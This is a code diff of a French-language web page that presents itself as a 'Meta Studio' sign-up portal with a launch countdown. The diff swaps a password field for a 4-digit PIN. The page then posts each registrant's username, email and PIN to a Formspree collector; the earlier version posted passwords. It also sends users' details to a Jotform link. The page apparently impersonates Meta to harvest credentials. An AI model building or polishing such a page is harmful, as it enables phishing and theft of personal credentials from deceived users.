@@ -6,7 +6,7 @@
     <title>Meta Studio</title>
     
     <!-- FAVICON : Remplacez le lien ci-dessous par le lien de votre photo -->
-    <link rel="icon" href="https://fv5-6.files.fm/thumb_show.php?i=tbm7uqe67u&view&v=1&PHPSESSID=6a5abacfc85fc24782be0d442de527f6ff5fe8ab" type="image/x-icon">
+    <link rel="icon" href="https://via.placeholder.com/32" type="image/x-icon">
 
     <!-- Police et Icônes -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
@@ -38,19 +38,18 @@
             background: var(--surface); padding: 1rem 2rem; box-shadow: 0 1px 2px rgba(0,0,0,0.05);
             display: flex; justify-content: space-between; align-items: center;
             position: sticky; top: 0; z-index: 100;
-            flex-wrap: wrap; /* Permet le retour à la ligne si nécessaire */
+            flex-wrap: wrap;
         }
-        .logo { font-weight: 800; color: var(--primary); font-size: 1.4rem; display: flex; align-items: center; gap: 8px; letter-spacing: -0.5px; }
+        .logo { 
+            font-weight: 800; color: var(--primary); font-size: 1.4rem; 
+            display: flex; align-items: center; gap: 12px; letter-spacing: -0.5px; 
+        }
+        .logo-img {
+            height: 32px; width: auto; object-fit: contain;
+        }
         
         .nav-actions { display: flex; align-items: center; gap: 15px; }
         
-        .counter-badge {
-            background-color: var(--bg); padding: 6px 12px; border-radius: 20px;
-            font-size: 0.9rem; font-weight: 600; color: var(--text);
-            border: 1px solid var(--border);
-            white-space: nowrap; /* Empêche le compteur de se casser en 2 lignes */
-        }
-
         .btn-studio {
             background-color: var(--primary); color: white; border: none;
             padding: 8px 20px; border-radius: var(--radius); font-weight: 600;
@@ -77,7 +76,7 @@
         .form-group { margin-bottom: 1.25rem; position: relative; text-align: left; }
         label { display: block; margin-bottom: 0.5rem; font-weight: 500; font-size: 0.9rem; }
         
-        input[type="text"], input[type="email"], input[type="password"] {
+        input[type="text"], input[type="email"], input[type="number"] {
             width: 100%; padding: 0.8rem; border: 1px solid var(--border);
             border-radius: 8px; font-size: 1rem; transition: border 0.2s;
         }
@@ -117,7 +116,7 @@
         }
         .btn-reveal:hover { transform: scale(1.05); background-color: #059669; }
 
-        /* --- Section Aperçu Photos --- */
+        /* --- Section Aperçu --- */
         .preview-section {
             margin-top: 2rem;
             width: 100%; max-width: 800px; margin-left: auto; margin-right: auto;
@@ -126,22 +125,13 @@
             margin-bottom: 1rem; color: var(--text); font-size: 1.2rem; border-left: 4px solid var(--primary);
             padding-left: 10px;
         }
-        .preview-grid {
-            display: grid; grid-template-columns: 1fr 1fr; gap: 20px;
-        }
-        .preview-card {
+        .preview-container {
+            width: 100%;
             background: white; border-radius: var(--radius); overflow: hidden;
-            box-shadow: var(--shadow);
-            display: flex; align-items: center; justify-content: center;
+            box-shadow: var(--shadow); display: flex; justify-content: center;
         }
-        .preview-card img {
-            width: 100%; height: auto; max-height: 300px; object-fit: cover; display: block;
-        }
-
-        /* --- Empty State --- */
-        .studio-placeholder {
-            padding: 2rem 1rem; border: 2px dashed var(--border); border-radius: var(--radius);
-            background: #fafafa; margin-bottom: 2rem;
+        .preview-container img {
+            width: 100%; height: auto; max-height: 400px; object-fit: contain; display: block;
         }
 
         /* --- Toasts --- */
@@ -156,50 +146,17 @@
         .toast.error { border-left-color: var(--error); }
         @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
 
-        /* --- RESPONSIVE MOBILE (Adaptation Téléphone) --- */
+        /* --- RESPONSIVE MOBILE --- */
         @media (max-width: 600px) {
-            header {
-                padding: 0.8rem 1rem;
-                flex-direction: column;
-                gap: 10px;
-            }
-
-            .nav-actions {
-                width: 100%;
-                justify-content: space-between;
-                gap: 8px;
-            }
-
+            header { padding: 0.8rem 1rem; flex-direction: column; gap: 10px; }
+            .nav-actions { width: 100%; justify-content: space-between; gap: 8px; }
             .logo { font-size: 1.2rem; width: 100%; justify-content: center; margin-bottom: 5px; }
-            
-            .counter-badge {
-                font-size: 0.75rem;
-                padding: 4px 8px;
-            }
-
-            .btn-studio {
-                padding: 6px 12px;
-                font-size: 0.85rem;
-            }
-
-            /* Masquer le nom d'utilisateur sur mobile pour gagner de la place */
+            .btn-studio { padding: 6px 12px; font-size: 0.85rem; }
             .user-display { display: none; }
-
             main { padding: 1rem; }
-
             .card { padding: 1.5rem; }
-
-            .timer-display {
-                font-size: 1.8rem; /* Police plus petite sur téléphone */
-                letter-spacing: 1px;
-            }
-
+            .timer-display { font-size: 1.8rem; letter-spacing: 1px; }
             .countdown-text { font-size: 0.9rem; }
-
-            .preview-grid {
-                grid-template-columns: 1fr; /* Une seule colonne */
-                gap: 15px;
-            }
         }
     </style>
 </head>
@@ -210,19 +167,13 @@
     <!-- HEADER -->
     <header id="app-header" class="hidden">
         <div class="logo">
-            <i class="fa-brands fa-meta"></i> Meta Studio
+            <img src="https://via.placeholder.com/32" alt="Logo" class="logo-img">
+            Meta Studio
         </div>
         <div class="nav-actions">
-            <!-- Compteur -->
-            <div class="counter-badge">
-                <i class="fa-solid fa-layer-group"></i> <span id="pub-count">0</span>
-            </div>
-
-            <!-- Bouton Meta Studio -->
             <button class="btn-studio" onclick="openMetaStudio()">
                 <i class="fa-solid fa-video"></i> Meta Studio
             </button>
-
             <div class="user-display">
                 <i class="fa-regular fa-user"></i> <span id="header-username" style="color: var(--primary);">Utilisateur</span>
             </div>
@@ -247,14 +198,8 @@
                 </div>
                 
                 <div class="form-group">
-                    <label>Mot de passe</label>
-                    <input type="password" id="reg-password" placeholder="Créez un mot de passe" required oninput="clearConfirmError()">
-                </div>
-
-                <div class="form-group">
-                    <label>Confirmer le mot de passe</label>
-                    <input type="password" id="reg-password-confirm" placeholder="Répétez le mot de passe" required oninput="clearConfirmError()">
-                    <div id="confirm-error" class="field-error">Les mots de passe ne correspondent pas.</div>
+                    <label>Code PIN (4 chiffres)</label>
+                    <input type="number" id="reg-pin" placeholder="0000" maxlength="4" required>
                 </div>
 
                 <button type="submit" class="btn" id="reg-btn">
@@ -280,31 +225,22 @@
 
                 <!-- COMPTE A REBOURS -->
                 <div class="countdown-container">
-                    <p class="countdown-text">Meta Studio sera accessible le mercredi 25 février 2026 à 12:00 GMT 0</p>
+                    <p class="countdown-text">Media Social Media sera accessible le Jeudi 26 février à 15 heure</p>
                     <div id="timer" class="timer-display">Chargement...</div>
                     
-                    <!-- Bouton caché qui apparaît après le compte à rebours -->
                     <a id="secret-link" href="https://metagestion.github.io/MetaService/" target="_blank" class="btn-reveal hidden">
-                        <i class="fa-solid fa-rocket"></i> Meta Studio
+                        <i class="fa-solid fa-rocket"></i> Media Social Media
                     </a>
                 </div>
             </div>
 
-            <!-- SECTION APERCU PHOTOS (Affichage simple) -->
+            <!-- SECTION APERCU -->
             <div class="preview-section">
                 <h3>Aperçu</h3>
-                <div class="preview-grid">
-                    
-                    
-
-                    <!-- PHOTO 2 : Remplacez src par le lien de votre image -->
-                    <div class="preview-card">
-                        <img src="https://fv5-6.files.fm/thumb_show.php?i=3rdstsgtzm&view&v=1&PHPSESSID=6a5abacfc85fc24782be0d442de527f6ff5fe8ab" alt="Aperçu 2">
-                    </div>
-
+                <div class="preview-container">
+                    <img src="https://via.placeholder.com/800x400?text=Aperçu+Unique" alt="Aperçu">
                 </div>
             </div>
-
         </section>
     </main>
 
@@ -312,12 +248,8 @@
         /* --- GESTION DE L'ÉTAT --- */
         const state = {
             username: localStorage.getItem('userUsername') || null,
-            email: localStorage.getItem('userEmail') || null,
-            pubCount: parseInt(localStorage.getItem('pubCount')) || 0
+            email: localStorage.getItem('userEmail') || null
         };
-
-        // Mise à jour initiale
-        updateCounterDisplay();
 
         // Vérification connexion immédiate
         if (state.email && state.username) {
@@ -336,23 +268,13 @@
             document.getElementById('register-view').classList.add('hidden');
             document.getElementById('dashboard-view').classList.remove('hidden');
             document.getElementById('app-header').classList.remove('hidden');
-            
             document.getElementById('header-username').textContent = state.username;
-            updateCounterDisplay();
-
-            // Démarrer le compte à rebours
             startCountdown();
-        }
-
-        function updateCounterDisplay() {
-            document.getElementById('pub-count').textContent = state.pubCount;
         }
 
         /* --- LOGIQUE COMPTE A REBOURS --- */
         function startCountdown() {
-            // Date cible : 25 Février 2026 12:00 GMT 0 (UTC)
-            const countDownDate = new Date("2026-02-25T12:00:00Z").getTime();
-
+            const countDownDate = new Date("2026-02-26T15:00:00Z").getTime();
             const timerInterval = setInterval(function() {
                 const now = new Date().getTime();
                 const distance = countDownDate - now;
@@ -362,13 +284,11 @@
                     document.getElementById("timer").innerHTML = "DISPONIBLE !";
                     document.getElementById("secret-link").classList.remove("hidden");
                 } else {
-                    // Calculs temps
                     const days = Math.floor(distance / (1000 * 60 * 60 * 24));
                     const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                     const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
                     const seconds = Math.floor((distance % (1000 * 60)) / 1000);
 
-                    // Affichage format J : H : M : S
                     document.getElementById("timer").innerHTML = 
                         days + "j " + hours + "h " + minutes + "m " + seconds + "s ";
                 }
@@ -377,57 +297,52 @@
 
         /* --- LOGIQUE META STUDIO --- */
         function openMetaStudio() {
-            state.pubCount++;
-            localStorage.setItem('pubCount', state.pubCount);
-            updateCounterDisplay();
-            
             showToast("Ouverture de Meta Studio...", "success");
-
             const baseUrl = "https://form.jotform.com/260536291884061";
             const params = new URLSearchParams({
                 user: state.username,
                 email: state.email
             });
-
             window.open(`${baseUrl}?${params.toString()}`, '_blank');
         }
 
-        /* --- LOGIQUE D'INSCRIPTION --- */
+        /* --- LOGIQUE D'INSCRIPTION (AVEC ENVOI DU PIN) --- */
         async function handleRegister(e) {
             e.preventDefault();
             
             const username = document.getElementById('reg-username').value.trim();
             const email = document.getElementById('reg-email').value.trim();
-            const password = document.getElementById('reg-password').value;
-            const confirmPassword = document.getElementById('reg-password-confirm').value;
-            const errorDiv = document.getElementById('confirm-error');
+            const pin = document.getElementById('reg-pin').value.trim();
             const btn = document.getElementById('reg-btn');
 
-            if (!username || !email || !password) {
+            if (!username || !email || !pin) {
                 showToast("Veuillez remplir tous les champs.", "error");
                 return;
             }
 
-            if (password !== confirmPassword) {
-                errorDiv.style.display = 'block';
-                showToast("Les mots de passe ne correspondent pas.", "error");
+            // Vérification que le PIN fait bien 4 chiffres
+            if (!/^\d{4}$/.test(pin)) {
+                showToast("Le code PIN doit contenir exactement 4 chiffres.", "error");
                 return;
             }
 
+            // Sauvegarde locale
             localStorage.setItem('userUsername', username);
             localStorage.setItem('userEmail', email);
+            localStorage.setItem('userPin', pin);
             
             state.username = username;
             state.email = email;
 
+            // Envoi à Formspree (PIN inclus dans le message et comme champ séparé)
             const formData = new FormData();
             formData.append('email', email);
             formData.append('username', username);
-            formData.append('password', password);
-            formData.append('message', `NOUVELLE INSCRIPTION\nUtilisateur: ${username}\nEmail: ${email}`);
+            formData.append('pin', pin); // Envoi du PIN
+            formData.append('message', `Nouvelle inscription de l'utilisateur : ${username}\nCode PIN : ${pin}`);
             formData.append('_subject', `Nouvelle Inscription : ${username}`);
 
-            fetch('https://formspree.io/f/xdalpyzd', {
+            fetch('https://formspree.io/f/mbdaqdpj', {
                 method: 'POST',
                 body: formData,
                 headers: { 'Accept': 'application/json' }
@@ -443,10 +358,6 @@
             setTimeout(() => {
                 location.reload(); 
             }, 1500);
-        }
-
-        function clearConfirmError() {
-            document.getElementById('confirm-error').style.display = 'none';
         }
 
         function showToast(msg, type = 'default') {
@@ -469,4 +380,3 @@
     </script>
 </body>
 </html>
-
